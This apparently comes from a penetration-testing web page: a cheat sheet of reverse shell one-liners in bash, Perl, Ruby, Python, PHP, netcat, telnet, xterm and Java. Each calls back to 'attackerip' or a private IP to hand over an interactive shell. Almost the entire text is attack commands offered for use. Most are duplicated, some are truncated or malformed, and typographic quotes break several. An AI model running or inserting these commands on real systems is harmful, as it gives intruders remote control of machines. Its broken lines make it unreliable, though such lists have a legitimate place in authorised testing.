## Reverse Shells

**Reverse Shellcode:**

BASH:

```
bash -i >& /dev/tcp/192.168.23.10/443 0>&1
exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done # or:
while read line 0<&5; do $line 2>&5 >&5; done
/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/192.168.23.10/443 0<&1 2>&1
```

PERL:

Shorter Perl reverse shell that does not depend on /bin/sh:

```
perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
```

⧉ Copied!

If the target system is running Windows use the following one-liner:

```
perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
```

**RUBY**:

Longer Ruby reverse shell that does not depend on /bin/sh:

```
ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.printio.read}end’
ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.printio.read}end’
```

⧉ Copied!

If the target system is running Windows use the following one-liner:

```
ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
```

⧉ Copied!

**PYTHON**:

python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((“10.0.0.1″,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[“/bin/sh”,”-i”\]);’
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((“10.0.0.1″,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[“/bin/sh”,”-i”\]);’

**PHP**:

This code assumes that the TCP connection uses file descriptor 3.

```
php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i <&3 >&3 2>&3″);’
php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i <&3 >&3 2>&3″);’
```

⧉ Copied!

If you would like a PHP reverse shell to download, try this link on pentestmonkey.net -> LINK

**NETCAT:**

Other possible Netcat reverse shells, depending on the Netcat version and compilation flags:

```
nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443
```

⧉ Copied!

If -e option is disabled, try this

```
mknod backpipe p && nc 192.168.23.10 443 0<backpipe | /bin/bash 1>backpipe
mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 4444
/bin/sh | nc 192.168.23.10 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
rm -f /tmp/p; mknod /tmp/p p && nc 192.168.23.10 444 0/tmp/
```

⧉ Copied!

If you have the wrong version of netcat installed, try

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.23.10 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

⧉ Copied!

TELNET:

If netcat is not available or /dev/tcp

```
mknod backpipe p && telnet attackerip 8080 0<backpipe | /bin/bash 1>backpipe
mknod backpipe p && telnet attackerip 8080 0<backpipe | /bin/bash 1>backpipe
```

⧉ Copied!

**XTERM:**

Xterm is the best..

To catch incoming xterm, start an open X Server on your system (:1 – which listens on TCP port 6001). One way to do this is with Xnest: It is available on Ubuntu.

```
Xnest :1 # Note: The command starts with uppercase X
Xnest :1 # Note: The command starts with uppercase X
```

⧉ Copied!

Then remember to authorise on your system the target IP to connect to you:

```
xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest, another tab xhost +targetip # Run this INSIDE the spawned xterm on the open X Server
xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest, another tab
xhost +targetip # Run this INSIDE the spawned xterm on the open X Server
```

⧉ Copied!

If you want anyone to connect to this spawned xterm try:

```
xhost + # Run this INSIDE the spawned xterm on the open X Server
xhost + # Run this INSIDE the spawned xterm on the open X Server
```

⧉ Copied!

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:

```
xterm -display attackerip:1
xterm -display attackerip:1
```

⧉ Copied!

Or:

```
$ DISPLAY=attackerip:0 xterm
$ DISPLAY=attackerip:0 xterm
```

⧉ Copied!

It will try to connect back to you, attackerip, on TCP port 6001.
Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:

```
/usr/openwin/bin/xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
```

⧉ Copied!

**PHP**:

```
php -r ‘$sock=fsockopen(“192.168.0.100″,4444);exec(“/bin/sh -i <&3 >&3 2>&3″);’
```

⧉ Copied!

**JAVA:**

```
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.0.100/4444;cat <&5 | while read line; do $line 2>&5 >&5; done”] as String[])
p.waitFor()
```

⧉ Copied!